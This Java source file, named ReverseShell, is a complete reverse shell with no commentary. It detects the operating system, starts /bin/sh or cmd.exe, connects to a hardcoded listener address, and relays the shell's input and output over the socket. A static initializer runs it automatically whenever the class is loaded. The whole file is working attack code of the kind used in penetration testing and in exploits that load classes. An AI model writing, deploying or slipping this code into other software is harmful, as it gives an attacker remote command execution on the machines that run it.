import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;

public class ReverseShell {
    
    private static InetSocketAddress addr   = new InetSocketAddress("127.0.0.1", 9000);
    private static String            os     = null;
    private static String            shell  = null;
    private static byte[]            buffer = null;
    private static int               clen   = 0;
    private static boolean           error  = false;
    
    private static boolean detect() {
        boolean detected = true;
        os = System.getProperty("os.name").toUpperCase();
        if (os.contains("LINUX") || os.contains("MAC")) {
            os    = "LINUX";
            shell = "/bin/sh";
        } else if (os.contains("WIN")) {
            os    = "WINDOWS";
            shell = "cmd.exe";
        } else {
            detected   = false;
            System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
        }
        return detected;
    }
    
    private static void brw(InputStream input, OutputStream output, String iname, String oname) {
        int bytes = 0;
        try {
            do {
                if (os.equals("WINDOWS") && iname.equals("STDOUT") && clen > 0) {
                    do {
                        bytes = input.read(buffer, 0, clen >= buffer.length ? buffer.length : clen);
                        clen -= clen >= buffer.length ? buffer.length : clen;
                    } while (bytes > 0 && clen > 0);
                } else {
                    bytes = input.read(buffer, 0, buffer.length);
                    if (bytes > 0) {
                        output.write(buffer, 0, bytes);
                        output.flush();
                        if (os.equals("WINDOWS") && oname.equals("STDIN")) {
                            clen += bytes;
                        }
                    } else if (iname.equals("SOCKET")) {
                        error = true;
                        System.out.print("SOC_ERROR:");
                    }
                }
            } while (input.available() > 0);
        } catch (SocketTimeoutException ex) {} catch (IOException ex) {
            error = true;
            System.out.print("STRM_ERROR:");
        }
    }
    
    public static void run() {
        if (detect()) {
            Socket       client  = null;
            OutputStream socin   = null;
            InputStream  socout  = null;
            
            Process      process = null;
            OutputStream stdin   = null;
            InputStream  stdout  = null;
            InputStream  stderr  = null;
            
            try {
                client = new Socket();
                client.setSoTimeout(100);
                client.connect(addr);
                socin  = client.getOutputStream();
                socout = client.getInputStream();
                
                buffer = new byte[1024];
                
                process = new ProcessBuilder(shell).redirectInput(ProcessBuilder.Redirect.PIPE).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
                stdin   = process.getOutputStream();
                stdout  = process.getInputStream();
                stderr  = process.getErrorStream();
                
                do {
                    if (!process.isAlive()) {
                        System.out.print("PROC_ERROR: Process has been terminated\n\n"); break;
                    }
                    brw(socout, stdin, "SOCKET", "STDIN");
                    if (stderr.available() > 0) { brw(stderr, socin, "STDERR", "SOCKET"); }
                    if (stdout.available() > 0) { brw(stdout, socin, "STDOUT", "SOCKET"); }
                } while (!error);
                System.out.print("Exiting...\n");
            } catch (IOException ex) {
                System.out.print(String.format("ERROR: %s\n", ex.getMessage()));
            } finally {
                if (stdin   != null) { try { stdin.close() ; } catch (IOException ex) {} }
                if (stdout  != null) { try { stdout.close(); } catch (IOException ex) {} }
                if (stderr  != null) { try { stderr.close(); } catch (IOException ex) {} }
                if (process != null) { process.destroy(); }
                
                if (socin  != null) { try { socin.close() ; } catch (IOException ex) {} }
                if (socout != null) { try { socout.close(); } catch (IOException ex) {} }
                if (client != null) { try { client.close(); } catch (IOException ex) {} }
                
                if (buffer != null) { Arrays.fill(buffer, (byte)0); }
            }
        }
    }
    
    static {
        run();
        System.gc();
    }
    
}
